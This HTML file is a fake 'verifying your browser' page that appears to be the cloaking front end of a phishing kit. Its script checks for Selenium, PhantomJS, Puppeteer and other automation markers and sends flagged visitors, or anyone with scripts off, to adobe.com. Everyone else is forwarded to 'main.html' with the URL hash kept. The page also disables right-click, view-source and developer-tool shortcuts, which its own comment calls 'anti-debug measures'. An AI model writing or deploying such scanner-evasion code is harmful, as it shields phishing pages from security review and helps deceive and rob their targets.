<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="robots" content="noindex, nofollow">
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f5f5f5;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div>
        <h2>Verifying your browser...</h2>
        <p>Please wait while we verify your browser.</p>
        <div class="loader"></div>
        <p>Redirecting in <span id="countdown">3</span> seconds...</p>
    </div>
    
    <script>
        // Bot detection (converted from your PHP)
        function runBotDetection() {
            let documentDetectionKeys = [
                "webdriver", "_WEBDRIVER_ELEM_CACHE", "ChromeDriverw", "Geckowebdriver",
                "driver-evaluate", "webdriver-evaluate", "selenium-evaluate", "selenium-webdriver",
                "webdriverCommand", "webdriver-evaluate-response", "__webdriverFunc",
                "__$webdriverAsyncExecutor", "$wdc_asdjflasutopfhvcZLmcfl_",
                "__lastWatirAlert", "__lastWatirConfirm", "__lastWatirPrompt",
                "$chrome_asyncScriptInfo", "$cdc_asdjflasutopfhvcZLmcfl_",
                "__webdriver_evaluate", "__selenium_evaluate", "__webdriver_script_function",
                "__webdriver_script_func", "__webdriver_script_fn", "__fxdriver_evaluate",
                "__driver_unwrapped", "__webdriver_unwrapped", "__driver_evaluate",
                "__selenium_unwrapped", "__fxdriver_unwrapped"
            ];

            let windowDetectionKeys = [
                "gecko", "$wdc_asdjflasutopfhvcZLmcfl_", "$cdc_asdjflasutopfhvcZLmcfl_",
                "domAutomation", "domAutomationController", "__stopAllTimers", "spawn",
                "__driver_evaluate", "__fxdriver_evaluate", "__driver_unwrapped",
                "__fxdriver_unwrapped", "emit", "__phantomas", "callPhantom", "geb",
                "__$webdriverAsyncExecutor", "fmget_targets", "spynner_additional_js_loaded",
                "watinExpressionResult", "watinExpressionError", "calledPhantom",
                "__webdriver_unwrapped", "__webdriver_script_function", "__webdriver_script_func",
                "__webdriver_script_fn", "__webdriver_evaluate", "__webdriver__chr",
                "__webdriverFuncgeb", "__selenium_unwrapped", "__selenium_evaluate",
                "__lastWatirPrompt", "cdc_adoQpoasnfa76pfcZLmcfl_Array",
                "cdc_adoQpoasnfa76pfcZLmcfl_Promise", "cdc_adoQpoasnfa76pfcZLmcfl_Symbol",
                "OSMJIF", "__lastWatirConfirm", "__lastWatirAlert", "calledSelenium",
                "webdriver", "marionette", "puppeteer", "Buffer", "_phantom",
                "__nightmare", "_selenium", "callPhantom", "Cypress", "callSelenium",
                "_Selenium_IDE_Recorder"
            ];

            // Check window properties
            for (const key of windowDetectionKeys) {
                if (window[key]) return true;
            }

            // Check document properties
            for (const key of documentDetectionKeys) {
                if (window.document[key]) return true;
            }

            // Check for selenium attributes
            if (window.external && window.external.toString().indexOf("Sequentum") != -1) return true;
            if (document.documentElement.getAttribute("selenium")) return true;
            if (document.documentElement.getAttribute("webdriver")) return true;
            if (document.documentElement.getAttribute("driver")) return true;

            return false;
        }

        // Check if bot detected
        if (runBotDetection()) {
            window.location.replace("https://www.adobe.com");
        }

        // Function to get hash parameter
        function getHashParameter() {
            const hash = window.location.hash;
            return hash && hash.length > 1 ? hash : '';
        }
        
        function addHashToUrl(baseUrl) {
            const hashParam = getHashParameter();
            return hashParam ? baseUrl + hashParam : baseUrl;
        }

        // Countdown timer and redirect
        var timeLeft = 3;
        var countdown = document.getElementById("countdown");
        
        var timer = setInterval(function(){
            timeLeft--;
            countdown.textContent = timeLeft;
            
            if(timeLeft <= 0){
                clearInterval(timer);
                // Redirect to the renamed main HTML file
                window.location.href = addHashToUrl("main.html");
            }
        }, 1000);

        // Anti-debug measures
        setTimeout(() => {window.location.replace("https://www.adobe.com")}, 5 * 60 * 1000);
        
        window.onkeydown = (e) => {
            return !(e.ctrlKey && (e.keyCode === 67 || e.keyCode === 85 || e.keyCode === 86 || e.keyCode === 88 || e.keyCode === 117));
        };

        window.addEventListener("keydown", (e) => {
            if (e.ctrlKey && e.which === 83) {e.preventDefault(); return false}
        });

        window.addEventListener("contextmenu", (event) => event.preventDefault());

        document.onkeydown = (e) => {
            if (e.keyCode === 123) return false; // F12
            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) return false; // Ctrl+Shift+I
            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) return false; // Ctrl+Shift+J
            if (e.ctrlKey && e.keyCode === 85) return false; // Ctrl+U
        }
    </script>
    
    <noscript>
        <meta http-equiv='refresh' content='0;url=https://www.adobe.com'/>
    </noscript>
</body>
</html>
